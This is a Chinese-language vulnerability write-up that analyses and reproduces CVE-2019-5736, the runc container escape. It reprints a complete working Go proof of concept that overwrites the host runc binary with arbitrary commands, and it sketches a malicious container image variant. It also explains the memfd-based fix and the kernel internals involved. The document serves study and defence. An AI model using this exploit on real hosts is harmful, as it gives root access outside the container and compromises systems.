---
title: CVE-2019-5736 分析复现
date: 2022-10-20 11:27:33
tags: CVE复现
author: click
---
## 漏洞分析

### docker exec 流程简述

*后续可以补充一下代码级别的分析* [_源码分析_](https://juejin.cn/post/6900589795370598414)
`docker exec` 负责在已有的容器环境中执行一个进程，其是通过调用 `runc exec` 来实现的，其大致流程：

1. runc-init 进程启动，通过 `setns` 系统调用加入到已有容器的所有 namespace 中
2. 以自身为范本启动一个子进程(为了真正加入到容器的 pid ns 中)
3. 通过 `exec` 系统调用执行用户指定的二进制程序

![image.png](https://b3logfile.com/file/2022/10/solo-fetchupload-15588129662853739748-xlWrKTY.png)

### 脆弱点

在上面的过程中，因为是加入所有 namespace 之后，再 `fork` 子进程来真正进入容器 `pid ns`（此时可以被容器内进程在 /proc/ 中观测到），与该子进程对应的一个特殊文件 `/proc/[runcinit-pid]/exe` 仍然指向宿主机上的 `runc` 二进制文件（**突破了 mnt namespace 的隔离**）。并且默认情况下，docker 没有开启 `user namespace`，所以容器内 root（真 root）用户具备对宿主机上 runc 二进制文件的读写的权限。

### 利用过程

1. 将 `exec` 常用目标（eg:/bin/bash、/bin/sh）文件内容修改为使用 `/proc/self/exe` 解释执行的方式，这样 `runc-init` 进程在使用 `exec` 系统调用替换自身时会向其传入自身指向的二进制文件（runc）

```bash
#!/proc/self/exe
```

![image.png](https://b3logfile.com/file/2022/10/solo-fetchupload-15939399325248072685-OUA733K.png)

2. 在容器中建立一个监控 `procfs` 的进程，等待之后执行 `docker exec(runc exec)` 时，`runc-init` 进程 `fork` 出的子进程，记录其进程号 （进入到容器 `pid ns`，就会在容器内 /proc 下建立对应的进程文件夹，可以根据 /proc 下的 `cmdline` runc 字符串内容来匹配）
3. 不断尝试使用只读方式打开第 2 步中找到的进程文件夹下的 exe 文件，从而获取指向宿主机上 `runc` 的文件描述符（`/proc/[runc-init 子进程]/exe`）（使用只读方式是因为内核不允许以写方式打开正在运行的二进制文件）（这里能够获取的时机应该是子进程通过 exec 调用目标程序内容(`#!/proc/self/exe`)后，因为在 exec 之前，该子进程是 `non-dumpable` 的，其他进程无法访问 `/proc/[pid]/exe`）
4. 不断尝试以写方式打开刚才保存的文件描述符（`/proc/self/fd/[fd_num]`）所指向的文件（宿主机上的 runc）。linux 不允许以写方式打开正在运行的二进制文件，等待 `runc` (传入 `exec()` 的目标二进制文件) 进程结束占用后，可以成功以写方式打开
5. 使用第 4 步中得到的写方式文件描述符，向其写入 payload，这样会成功将 payload 写入到宿主机上的 runc 二进制文件

## poc

```go
package CVE_2019_5736

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
import (
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
)

var shellCmd string

func init() {
	flag.StringVar(&shellCmd, "shell", "", "Execute arbitrary commands")
	flag.Parse()
}

func main() {
	// This is the line of shell commands that will execute on the host
	var payload = "#!/bin/bash \n" + shellCmd
	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
	fd, err := os.Create("/bin/sh")
	if err != nil {
		fmt.Println(err)
		return
	}
	// 用 #!/proc/self/exe 覆盖容器内的 /bin/sh，导致下次执行 /bin/sh 时会重定向到 runc
    // 不对，是为了让 non-dumpable 的 runc-init 进程在 exec 时调用自身，去掉 non-dumpable 标志，
    // 从而可以获取到 /proc/self/exe 指向的宿主机上 runc 二进制文件
	fmt.Fprintln(fd, "#!/proc/self/exe")
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("[+] Overwritten /bin/sh successfully")

	// Loop through alpl processes to find one whose cmdline includes runcinit
	// This will be the process created by runc
	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		// 遍历容器内的 /proc/<pid>/cmdline 内容，找到 runc 对应进程号
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				fmt.Println("[+] Found the PID:", f.Name())
				fmt.Println("[+] cmdline:", fstring)
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}

	// We will use the pid to get a file handle for runc on the host.
	// 用 readonly 打开 runc 进程对应的 /proc/<pid>/exe 的 magic links，保存到攻击进程的文件描述符
	var handleFd = -1
	for handleFd == -1 {
		// Note, you do not need to use the O_PATH flag for the exploit to work.
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println("[+] Successfully got the file handle")

	// Now that we have the file handle, lets write to the runc binary and overwrite it
	// It will maintain it's executable flag
	// 不断尝试写入刚刚获取的文件描述符
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			fmt.Println("[+] Successfully got write handle", writeHandle)
			fmt.Println("[+] The command executed is" + payload)
			writeHandle.Write([]byte(payload))
			return
		}
	}
}
```

## 恶意镜像的供应链角度

因为容器是单进程模型，而上述 poc 的利用方式，需要先在容器中创建一个监控进程，再等待用户执行 `docker exec` 在容器中执行命令。这种情况在实际部署中并不多见，因此最理想的利用场景是在第一次执行 `docker run` 的时候就能够完成整个利用。

- 需要一个 `dumpable` 状态的 `runc` 进程，用来获取对应的 `/proc/[pid]/exe`

这一步可以通过设置镜像 `entrypoint` 为 `/proc/self/exe` 符号连接来实现，在 `non-dumpable` 状态的 `runc-init` 进程通过 exec 切换到目标进程的时候，传入 `/proc/self/exe` 可以实现获得一个 dumpable 状态的 `runc` 进程

- 需要一个指向宿主机 runc 的文件描述符

可以通过动态链接库注入（会调用容器文件系统中的动态链接库）的方式，向容器环境中执行 runc 时（`exec` 执行 `/proc/self/exe` 之后）注入额外代码，来以只读方式打开一个指向 `/proc/self/exe` 的文件描述符（假设分配的文件描述符为 3 `/proc/self/fd/3`）。

- 需要指向宿主机 runc 的可写文件描述符

在 `runc-init` 进程运行的时候，会占用 runc 二进制文件，所以不可以被写方式打开。可以通过 `exec` 系统调用执行容器中的另一二进制文件（/evil），来解除对 runc 文件的占用。并且 `exec` 之后，先前只读打开的文件描述符依然存在，可以通过以可写方式打开之前保存的指向 runc 的文件描述符（`/proc/self/fd/3`）来获得目标，这时可以实现向宿主机上的 runc 写入任意内容。

- 需要宿主机上再执行一次  runc

`docker run` 命令会执行多次 runc，创建并运行容器（`runc create`、`run start`、`run init`），容器内利用程序完成后，停止容器（`runc state`、`run kill`、`run delete`）。可以看到只需要等待写入宿主机 runc 文件的任务完成后，容器停止时，即会触发写入的任意内容。

_上述方案的第 2、3 步我感觉也可以通过 fork 一个子进程出来，按照先前 poc 的方式来利用漏洞（待验证）_

## 修复方案

在 start 或 attach 到一个容器的时候，runc 进程会将 runc 二进制文件使用 `memfd_create()` 拷贝到内存匿名文件中去，并且使用 `fcntl()` 对其设置 `seals`，保护其不可被修改。最后使用 `fexecve()` 将创建的 `memfd` 传入，从而确保 runc 进程所对应的二进制文件为内存中的匿名文件，而不是宿主机上的 runc 文件。

![image.png](https://b3logfile.com/file/2022/10/solo-fetchupload-16360844514762207749-PPFhxJt.png)
![image.png](https://b3logfile.com/file/2022/10/solo-fetchupload-74988527725724653-AyzchNZ.png)
但由于这个拷贝的动作发起时，runc 进程已经应用了对应容器的 cgroup 资源限制，如果其中对 memory 的限制非常小（10Mb），那这个动作可能会导致容器内的进程由于 OOM 被容器杀死。
[修复方案的内存使用讨论](https://github.com/opencontainers/runc/issues/1980)

## 思考

### 容器中容易出现问题的点

- 容器中的整个环境都是不可信的（容器内的文件，链接库，进程...）
- 容器进程的启动过程中存在 ns 切换，runc-init 进程到目标进程的切换，这个过程中往往会存在问题
- 操作系统内核的一些特性，比如 /proc 目录下一些文件的 handler 并没有考虑 namespace 的隔离

### 如何扫描

- _暂时还没有好的想法，可以后面看看别人的扫描器实现方法_

## 问题

- _为什么第一次 exec 就可以执行被修改过的 runc，它是通过  #!/proc/self/exec  来将要执行的目标指向 runc，执行的时候应该已经进入容器 ns 了吧，那此时执行的文件写入不应该是在容器里吗？（需要看一下 docker exec 过程）_
  经过实验，执行修改过的 runc 时，没有进入到容器的 ns 中，这是为什么呢？
  从进程状态看起来，感觉是覆盖 docker-runc 文件之后，docker-containerd-shim 因为某些原因调用了一次 docker-runc state 查看了一下容器状态，从而进行了一次在宿主机上执行 docker-runc 的操作
  并且，在 `exec` 之前，进程的状态是 `non-dumpable`，其他进程无法通过访问 `/proc/[pid]/exe` 链接到目标二进制程序，在 `exec` 之后，对 `/proc/[pid]/exe` 的 open 才会成功。因此，第一次 `exec` 只是修改了宿主机 runc 的内容，没有执行。
  至于上面的 poc 通过一次 `docker exec` 的成功效果，是因为一次 `docker exec` 会触发多次 runc 调用(`runc exec`/ `runc state` ...)

```bash
poc shellcode 的父进程：
/bin/bash /usr/bin/docker-runc --root /var/run/docker/runtime-runc/moby --log /run/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/61dec41083352ceba10aaf15e72722513594f12560d4d786f8a82592ff4659c6/log.json --log-format json state 61dec41083352ceba10aaf15e72722513594f12560d4d786f8a82592ff4659c6
其 ns 均为宿主机 ns

爷爷进程：
docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/61dec41083352ceba10aaf15e72722513594f12560d4d786f8a82592ff4659c6 -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
其 ns 均为宿主机 ns
```

- *进入容器 `mnt ns`，会看到宿主机文件吗？*
  不会看到宿主机文件，直接是容器内文件系统
- *`non-dumpable` 的 `/proc/pid/exe` 能打开吗，只读打开呢？*
  不可以 _（待补充 `non-dumpable` 的文档）_
- *为什么不直接修改 `runc-init` 进程 `exec` 之前的 `/proc/self/exe` 内容呢？*
  这是 CVE-2016-9962 的缓解方案导致的。在 `exec` 之前，`runc-init`进程被设置为`non-dumpable`，其他进程无法通过 `/proc/[pid]/exe` 符号连接来访问 `runc` 进程的二进制文件。调用 `exec` 系统调用，则会去掉这个 flag，所以通过 `runc-init`进程`exec("/proc/self/exe")`，这样就会得到一个没有`non-dumpable`标志的`runc`进程。这样，其他进程就可以打开 `runc` 进程对应的`/proc/[pid]/exe` 符号连接了。
- _发现 ubuntu:18.04 容器镜像中的 bash，在运行的时候不会占用 `/proc/[pid]/exe` 所指向的文件？_
  目前还没弄清楚原因，下一步要调试一下 `bash` 进程对应二进制文件的 `inode->i_writecount`

## 相关知识

### proc magic link

procfs 是一个伪文件系统，对它的文件系统操作并不对应磁盘的读写，而是与内核相关的操作函数。一般的符号连接中，保存的是目标文件的路径信息。而对于 procfs 中的 link 类文件来说，其符号连接的实现有自定义的 handler 函数，其注册通过 `LNK` 宏来定义的：
![image.png](https://b3logfile.com/file/2022/10/solo-fetchupload-16725893678335137439-MGxxTl8.png)
在打开该符号链接时，`trailing_symlink()->get_link()` 会调用 `proc_pid_get_link()`：
![image.png](https://b3logfile.com/file/2022/10/solo-fetchupload-12613237833510225645-Vh1262p.png)
在 `proc_pid_get_link()` 中，会调用通过 `LNK` 宏注册进去的 handler 函数。对于 `/proc/[pid]/exe` 来说，则是 `proc_exe_link()` 函数：
![image.png](https://b3logfile.com/file/2022/10/solo-fetchupload-16784126404961812867-r2gMqu1.png)
在 `proc_exe_link()` 中可以看到，这里直接将进程对应的 exe 文件的文件句柄中的 `f_path` 传给了 `exe_path` 指针，也就是 `proc_pid_get_link()` 中的 `&path`。
![image.png](https://b3logfile.com/file/2022/10/solo-fetchupload-1051479409702616353-TY2GLet.png)
回到 `proc_pid_get_link()` 中，最后通过 `nd_jump_link()` 将当前路径搜索过程 `nd` 的 `path`、`inode` 更新为刚才所获得的 `&path` 指针中的内容：
![image.png](https://b3logfile.com/file/2022/10/solo-fetchupload-16533038039889352014-FqDYwVE.png)
这样就获得了目标文件的 `inode` 结构体，之后的打开流程就与正常文件相同了。
**可以发现，上述打开 `/proc/[pid]/exe` 文件的整个过程中，没有受到 `mnt namespace` 的影响，因为没有根据目标文件路径进行搜索的这一步骤，而是在权限检查通过后，直接将目标文件的文件句柄传递给了打开过程，直接获得了目标文件的 `inode` 结构体。**

## TODO

+ 补充一下 docker run/docker exec 代码级别的分析
+ 恶意容器镜像供应链方案的第 2、3 步我感觉也可以通过 so 库文件 fork 一个子进程出来，按照先前 poc 的方式来利用漏洞（待验证）
+ 如何构建针对这类问题的扫描器
+ 补充 non-dumpable 的文档
+ ubuntu:18.04 容器镜像中的 bash，在运行的时候不会占用 /proc/[pid]/exe 所指向的文件？

## Ref

- [Breaking out of Docker via runC – Explaining CVE-2019-5736, Yuval Avrahami](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736)
- [CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host, dragonsector](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
- [容器逃逸成真：从CTF解题到CVE-2019-5736漏洞挖掘分析, 绿盟星云实验室](https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247486996&idx=1&sn=7c4e107e26ee59d0fcb1f8b4bb49e30d)
- [CVE-2019-5736 PoC, Frichetten](https://github.com/Frichetten/CVE-2019-5736-PoC)
- [cve-2019-5736 修复 commit, cyphar](https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d)
- [[CVE-2019-5736]: Runc uses more memory during start up after the fix, Github Issue](https://github.com/opencontainers/runc/issues/1980)
- [memfd_create(2), man page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)



